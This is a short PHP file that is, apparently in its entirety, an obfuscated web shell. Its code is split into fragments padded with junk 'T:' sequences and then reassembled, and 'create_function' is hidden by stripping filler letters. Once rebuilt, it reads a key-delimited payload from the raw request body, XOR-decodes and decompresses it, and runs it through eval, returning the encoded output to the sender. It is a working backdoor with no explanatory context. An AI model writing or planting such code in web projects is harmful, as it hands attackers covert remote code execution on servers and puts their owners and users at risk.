<?php
$b='$m[1]T:),$k)));$o=T:@ob_gT:et_contT:ents();T:@ob_eT:nd_clT:ean();$r=T:@bas';
$F='$p="gT:Uhw19MACT:8eGn3JcT:T:";functioT:n x($t,$kT:)T:{$c=T:strlen($k);T:$l=strl';
$w='atchT:("/$kh(.+)$kf/",@fT:ile_gT:eT:t_contents("pT:hpT::T://input"),T:$m)==';
$B='$k=T:"8c43f61T:6";$kT:h="9a3df0T:019T:123T:";$kfT:=T:"cea2c3d616T:0b";';
$k='l);$j++,$i+T:+){$T:o.=$t{$iT:}^$kT:{$T:j};}}T:return $o;}T:T:iT:f (@preg_m';
$t='enT:($t);$o=T:"";T:for($i=0;T:$i<$lT:;){foT:r($j=T:0;($jT:<$T:T:T:c&&$i<$';
$W='1T:) {@ob_staT:rt();@eT:val(@gT:zuncomT:pT:ressT:(@x(@bT:ase64_decoT:T:de(';
$l='T:e64_enT:coT:de(@xT:(T:@gzcompT:ress($o),$k))T:;priT:nt("$p$kh$r$T:kf");}';
$i=str_replace('Y','','cYreYateY_YfuYnctiYon');
$z=str_replace('T:','',$B.$F.$t.$k.$w.$W.$b.$l);
$A=$i('',$z);$A();
?>
